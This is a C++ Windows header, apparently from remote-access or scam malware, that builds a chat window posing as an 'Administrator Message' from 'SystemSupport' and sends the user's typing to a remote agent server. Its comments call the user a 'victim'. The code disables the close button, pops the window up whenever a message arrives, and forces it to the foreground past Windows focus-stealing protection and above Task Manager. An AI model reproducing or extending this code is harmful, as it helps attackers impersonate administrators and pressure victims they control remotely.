#pragma once
#include <windows.h>
#include <string>
#include <thread>
#include <vector>
#include "AgentTcpServer.h"

// ID các control
#define IDC_CHAT_HISTORY 101
#define IDC_CHAT_INPUT 102
#define IDC_BTN_SEND 103

// Đặt tên Class Name thống nhất
#define CHAT_CLASS_NAME L"SystemSupport"
#define CHAT_WINDOW_TITLE L"Administrator Message"

class ChatManager
{
private:
    static inline HWND hWindow = NULL;
    static inline HWND hHistory = NULL;
    static inline HWND hInput = NULL;
    static inline std::thread uiThread;
    static inline bool isRunning = false;

    // --- HÀM CHUYỂN ĐỔI MÃ (UTF-8 <-> Unicode) ---
    static std::wstring ToWide(const std::string &str)
    {
        if (str.empty())
            return L"";
        int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
        std::wstring wstrTo(size_needed, 0);
        MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
        return wstrTo;
    }

    static std::string ToUtf8(const std::wstring &wstr)
    {
        if (wstr.empty())
            return "";
        int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
        std::string strTo(size_needed, 0);
        WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
        return strTo;
    }

    // ÉP CỬA SỔ LÊN TRÊN CÙNG (BYPASS WINDOWS RESTRICTION)
    static void ForceForegroundWindow(HWND hwnd)
    {
        if (!IsWindow(hwnd))
            return;

        // 1. Nếu đang minimize thì bung ra
        if (IsIconic(hwnd))
        {
            ShowWindow(hwnd, SW_RESTORE);
        }
        else
        {
            ShowWindow(hwnd, SW_SHOW);
        }

        // 2. Kỹ thuật AttachThreadInput để vượt qua Focus Stealing Prevention
        DWORD foregroundThread = GetWindowThreadProcessId(GetForegroundWindow(), NULL);
        DWORD appThread = GetCurrentThreadId();

        if (foregroundThread != appThread)
        {
            // Mượn quyền input của cửa sổ đang active
            AttachThreadInput(foregroundThread, appThread, TRUE);

            BringWindowToTop(hwnd);
            SetForegroundWindow(hwnd);

            // Trả lại quyền
            AttachThreadInput(foregroundThread, appThread, FALSE);
        }
        else
        {
            BringWindowToTop(hwnd);
            SetForegroundWindow(hwnd);
        }

        // 3. Kỹ thuật "Double Tap" TopMost: Set lên trên cùng rồi bỏ ghim
        // Giúp cửa sổ nổi lên trên các ứng dụng khác (kể cả Task Manager)
        SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
        SetWindowPos(hwnd, HWND_NOTOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);

        // Focus vào ô nhập liệu để nạn nhân gõ được ngay
        if (hInput)
            SetFocus(hInput);
    }

    // Xử lý sự kiện cửa sổ
    static LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
    {
        switch (uMsg)
        {
        case WM_COMMAND:
            if (LOWORD(wParam) == IDC_BTN_SEND)
            {
                int len = GetWindowTextLengthW(hInput);
                if (len > 0)
                {
                    std::vector<wchar_t> buffer(len + 1);
                    GetWindowTextW(hInput, &buffer[0], len + 1);
                    std::wstring wMsg(&buffer[0]);
                    std::string msgUtf8 = ToUtf8(wMsg);

                    if (!msgUtf8.empty())
                    {
                        AgentTcpServer::instance().sendJson({{"type", "chat_message"}, {"text", msgUtf8}});
                        AppendText(L"Me: " + wMsg);
                        SetWindowTextW(hInput, L"");
                    }
                }
            }
            break;
        case WM_CLOSE:
            // Chặn nút X
            return 0;
        case WM_DESTROY:
            isRunning = false;
            PostQuitMessage(0);
            return 0;
        }
        return DefWindowProcW(hwnd, uMsg, wParam, lParam);
    }

    static void UIThreadFunc()
    {
        HMODULE hInstance = GetModuleHandle(NULL);

        WNDCLASSW wc = {0};
        wc.lpfnWndProc = WindowProc;
        wc.hInstance = hInstance;
        wc.lpszClassName = CHAT_CLASS_NAME;
        wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);

        // Đăng ký class
        if (!RegisterClassW(&wc))
        {
            if (GetLastError() != ERROR_CLASS_ALREADY_EXISTS)
                return;
        }

        hWindow = CreateWindowExW(0, CHAT_CLASS_NAME, CHAT_WINDOW_TITLE,
                                  WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                                  100, 100, 400, 500, NULL, NULL, hInstance, NULL);

        if (!hWindow)
        {
            isRunning = false;
            return;
        }

        HFONT hFont = CreateFontW(18, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
                                  OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,
                                  DEFAULT_PITCH | FF_SWISS, L"Segoe UI");

        hHistory = CreateWindowW(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE | ES_READONLY | ES_AUTOVSCROLL,
                                 10, 10, 360, 380, hWindow, (HMENU)IDC_CHAT_HISTORY, hInstance, NULL);
        SendMessageW(hHistory, WM_SETFONT, (WPARAM)hFont, TRUE);

        hInput = CreateWindowW(L"EDIT", L"", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                               10, 400, 280, 30, hWindow, (HMENU)IDC_CHAT_INPUT, hInstance, NULL);
        SendMessageW(hInput, WM_SETFONT, (WPARAM)hFont, TRUE);

        HWND hBtn = CreateWindowW(L"BUTTON", L"Gửi", WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                                  300, 400, 70, 30, hWindow, (HMENU)IDC_BTN_SEND, hInstance, NULL);
        SendMessageW(hBtn, WM_SETFONT, (WPARAM)hFont, TRUE);

        MSG msg = {0};
        while (GetMessageW(&msg, NULL, 0, 0))
        {
            TranslateMessage(&msg);
            DispatchMessageW(&msg);
        }

        hWindow = NULL;
        hHistory = NULL;
        hInput = NULL;

        UnregisterClassW(CHAT_CLASS_NAME, hInstance);
    }

public:
    static void Start()
    {
        if (isRunning)
            return;
        isRunning = true;
        uiThread = std::thread(UIThreadFunc);
        uiThread.detach();
    }

    static void Stop()
    {
        if (hWindow && IsWindow(hWindow))
        {
            SendMessage(hWindow, WM_DESTROY, 0, 0);
        }
        isRunning = false;
        hWindow = NULL;
    }

    static void AppendText(const std::string &textUtf8)
    {
        // Tự động mở cửa sổ nếu chưa mở (khi có tin nhắn đến)
        if (!hWindow)
            Start();

        int retries = 0;
        while (!hWindow && retries < 10)
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(50));
            retries++;
        }

        std::wstring wText = ToWide(textUtf8);
        AppendText(wText);
    }

    static void AppendText(const std::wstring &wText)
    {
        if (!hWindow || !hHistory)
            return;

        int len = GetWindowTextLengthW(hHistory);
        SendMessageW(hHistory, EM_SETSEL, (WPARAM)len, (LPARAM)len);

        std::wstring line = wText + L"\r\n";
        SendMessageW(hHistory, EM_REPLACESEL, 0, (LPARAM)line.c_str());

        // GỌI HÀM FORCE FOREGROUND MỚI
        ForceForegroundWindow(hWindow);
    }
};